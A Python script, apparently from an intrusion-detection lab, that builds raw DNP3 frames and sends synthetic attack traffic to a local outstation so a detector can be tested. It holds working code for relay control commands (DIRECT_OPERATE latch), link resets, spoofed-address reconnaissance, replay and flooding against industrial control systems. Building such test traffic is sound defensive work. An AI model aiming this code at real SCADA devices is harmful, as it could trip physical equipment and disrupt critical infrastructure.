"""
dnp3_attack_generator.py
========================
Generates synthetic live DNP3 attack traffic via raw TCP sockets.
No Scapy required — uses pure Python socket + manual DNP3 frame building.

Frame layout verified against real captured traffic:
  raw[0:2]  = 0x05 0x64   (start bytes)
  raw[2]    = length
  raw[3]    = ctrl byte
  raw[4:6]  = dst_addr (little-endian)
  raw[6:8]  = src_addr (little-endian)
  raw[8:10] = CRC (data-link header CRC)
  raw[10]   = transport header
  raw[11]   = application control byte
  raw[12]   = application function code  ← capture_predict_dnp3.py reads here
  raw[13:]  = application payload

Usage:
    python dnp3_attack_generator.py --attack all
    python dnp3_attack_generator.py --attack DOS_ATTACK --count 50
    python dnp3_attack_generator.py --attack RESTART_ATTACK --delay 0.02
"""

import struct
import socket
import time
import random
import argparse

# ── Config ─────────────────────────────────────────────────────────────────
TARGET_IP   = "127.0.0.1"
TARGET_PORT = 20003
MASTER_ADDR = 2
SLAVE_ADDR  = 1

# ── DNP3 CRC-16 ────────────────────────────────────────────────────────────
CRC_TABLE = []
for _i in range(256):
    _crc = _i
    for _ in range(8):
        _crc = (_crc >> 1) ^ 0xA6BC if (_crc & 1) else _crc >> 1
    CRC_TABLE.append(_crc)

def dnp3_crc(data: bytes) -> bytes:
    crc = 0x0000
    for b in data:
        crc = CRC_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return struct.pack("<H", (~crc) & 0xFFFF)

# ── Frame Builder ───────────────────────────────────────────────────────────
def build_frame(func_code_link: int,
                func_code_app:  int,
                src: int, dst: int,
                payload: bytes = b"",
                dir_bit: int = 1,
                prm_bit: int = 1) -> bytes:
    """
    Build a complete DNP3 frame matching the byte layout that
    capture_predict_dnp3.py expects:
      raw[10] = transport header
      raw[11] = app control byte
      raw[12] = application function code   ← key field
    """
    transport = 0xC0               # FIR=1, FIN=1, sequence=0
    app_ctrl  = 0xC0               # FIR=1, FIN=1, CON=0, sequence=0
    app_layer = bytes([transport, app_ctrl, func_code_app]) + payload

    ctrl   = ((dir_bit & 1) << 7) | ((prm_bit & 1) << 6) | (func_code_link & 0x0F)
    length = 5 + len(app_layer)

    header = bytes([0x05, 0x64, length & 0xFF, ctrl & 0xFF]) \
           + struct.pack("<H", dst) \
           + struct.pack("<H", src)
    header += dnp3_crc(header)

    # User-data in 16-byte blocks, each followed by 2-byte CRC
    user_data = b""
    for off in range(0, len(app_layer), 16):
        blk = app_layer[off:off + 16]
        user_data += blk + dnp3_crc(blk)

    return header + user_data

# ── Helpers ─────────────────────────────────────────────────────────────────
def connect() -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET_IP, TARGET_PORT))
    print(f"  [CONNECTED] {TARGET_IP}:{TARGET_PORT}")
    return s

def send(sock, frame: bytes, label: str):
    try:
        sock.sendall(frame)
        func_code = frame[12] if len(frame) > 12 else "?"
        print(f"  [TX] {label:30s} | {len(frame):3d}B | func_code_app=0x{func_code:02X}")
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

def banner(name, count, delay):
    print(f"\n{'='*62}")
    print(f"  ATTACK: {name}  ({count} pkts, delay={delay}s)")
    print(f"{'='*62}")

# ── Attack Functions ─────────────────────────────────────────────────────────

def restart_attack(count=20, delay=0.05):
    """
    RESTART_ATTACK
    Rapid RESET_LINK_STATES (func_code_link=0x00) frames.
    Matching features:
      - dnp3.func_code_link = 0
      - tcp.time_delta ≈ 0.05s (very fast)
      - frame.len = small (61–68 bytes)
    """
    banner("RESTART_ATTACK", count, delay)
    s = connect()
    for i in range(count):
        frame = build_frame(
            func_code_link=0x00,   # RESET_LINK_STATES
            func_code_app =0x00,   # CONFIRM
            src=MASTER_ADDR, dst=SLAVE_ADDR,
            payload=b"",
            dir_bit=1, prm_bit=1
        )
        send(s, frame, f"RESTART #{i+1:03d}")
        time.sleep(delay)
    s.close()
    print("  [DONE] RESTART_ATTACK\n")


def control_attack(count=20, delay=0.1):
    """
    CONTROL_ATTACK
    DIRECT_OPERATE (func_code_app=0x03) with CROB payload.
    Matching features:
      - dnp3.func_code_app = 3
      - frame.len / tcp.len = large (payload)
      - dnp3.payload_len = high
    """
    banner("CONTROL_ATTACK", count, delay)
    s = connect()
    for i in range(count):
        # Control Relay Output Block (Group 12 Var 1)
        crob = bytes([
            0x01, 0x28, 0x01, 0x00,   # g12v1, 1 obj, index 0
            0x03,                      # LATCH_ON
            0x01,                      # count
            0x00, 0xC2, 0x01, 0x00,   # on_time
            0x00, 0xC2, 0x01, 0x00,   # off_time
            0x00,                      # status
        ]) + bytes([0x00] * random.randint(10, 40))

        frame = build_frame(
            func_code_link=0x03,   # USER_DATA_CONFIRMED
            func_code_app =0x03,   # DIRECT_OPERATE
            src=MASTER_ADDR, dst=SLAVE_ADDR,
            payload=crob,
            dir_bit=1, prm_bit=1
        )
        send(s, frame, f"CONTROL #{i+1:03d}")
        time.sleep(delay)
    s.close()
    print("  [DONE] CONTROL_ATTACK\n")


def dnp3_recon(count=20, delay=0.08):
    """
    DNP3_RECON
    Rapid READs from rotating src_addr (network enumeration).
    Matching features:
      - dnp3.func_code_app = 1 (READ)
      - dnp3.src_addr = varies 3-200
      - fast time_delta
    """
    banner("DNP3_RECON", count, delay)
    s = connect()
    for i in range(count):
        fake_src = random.randint(3, 200)
        payload = bytes([
            0x3C, 0x02, 0x06,   # g60v2 Class 1
            0x3C, 0x03, 0x06,   # g60v3 Class 2
            0x3C, 0x04, 0x06,   # g60v4 Class 3
        ])
        frame = build_frame(
            func_code_link=0x04,   # UNCONFIRMED_USER_DATA
            func_code_app =0x01,   # READ
            src=fake_src, dst=SLAVE_ADDR,
            payload=payload,
            dir_bit=1, prm_bit=0
        )
        send(s, frame, f"RECON #{i+1:03d} src_addr={fake_src}")
        time.sleep(delay)
    s.close()
    print("  [DONE] DNP3_RECON\n")


def replay_attack(count=20, delay=0.02):
    """
    REPLAY_ATTACK
    Same captured frame replayed at high speed.
    Matching features:
      - identical raw_hex every packet
      - tcp.time_delta ≈ 0.02s (very fast)
    """
    banner("REPLAY_ATTACK", count, delay)
    s = connect()

    captured = build_frame(
        func_code_link=0x04,
        func_code_app =0x01,   # READ
        src=MASTER_ADDR, dst=SLAVE_ADDR,
        payload=bytes([0x3C, 0x01, 0x06]),
        dir_bit=1, prm_bit=0
    )
    print(f"  [CAPTURED FRAME] {captured.hex()}")

    for i in range(count):
        send(s, captured, f"REPLAY #{i+1:03d}")
        time.sleep(delay)
    s.close()
    print("  [DONE] REPLAY_ATTACK\n")


def dos_attack(count=30, delay=0.005):
    """
    DOS_ATTACK
    Max-size frames at minimal inter-packet delay.
    Matching features:
      - tcp.time_delta ≈ 0.005s (burst)
      - frame.len = large (junk payload 80+ bytes)
      - tcp.len = large
    """
    banner("DOS_ATTACK", count, delay)
    s = connect()
    for i in range(count):
        junk = bytes([0xFF] * random.randint(60, 100))
        frame = build_frame(
            func_code_link=0x04,
            func_code_app =0x81,   # RESPONSE (spoofed)
            src=MASTER_ADDR, dst=SLAVE_ADDR,
            payload=junk,
            dir_bit=0, prm_bit=0
        )
        send(s, frame, f"DOS #{i+1:03d}")
        time.sleep(delay)
    s.close()
    print("  [DONE] DOS_ATTACK\n")


# ── Main ────────────────────────────────────────────────────────────────────
ATTACK_MAP = {
    "RESTART_ATTACK": restart_attack,
    "CONTROL_ATTACK": control_attack,
    "DNP3_RECON":     dnp3_recon,
    "REPLAY_ATTACK":  replay_attack,
    "DOS_ATTACK":     dos_attack,
}

def main():
    parser = argparse.ArgumentParser(description="DNP3 Attack Traffic Generator")
    parser.add_argument("--attack", default="all",
                        choices=list(ATTACK_MAP.keys()) + ["all"])
    parser.add_argument("--count", type=int,   default=20)
    parser.add_argument("--delay", type=float, default=None)
    args = parser.parse_args()

    print("=" * 62)
    print("  DNP3 ATTACK GENERATOR")
    print(f"  Target : {TARGET_IP}:{TARGET_PORT}")
    print(f"  NOTE   : func_code verified at raw[12] — matches capture script")
    print("=" * 62)
    print()
    print("  Step 1: python dnp3_outstation.py       (Terminal 1)")
    print("  Step 2: python capture_predict_dnp3.py  (Terminal 2)")
    print("  Step 3: python dnp3_attack_generator.py (Terminal 3) ← you are here")
    print()

    targets = list(ATTACK_MAP.items()) if args.attack == "all" else \
              [(args.attack, ATTACK_MAP[args.attack])]

    for name, fn in targets:
        kw = {"count": args.count}
        if args.delay:
            kw["delay"] = args.delay
        fn(**kw)
        if args.attack == "all":
            time.sleep(1)

    # print("\n[ALL DONE] Check dnp3_capture_with_predictions_all_features.xlsx")
    print("\n[ALL DONE]")


if __name__ == "__main__":
    main()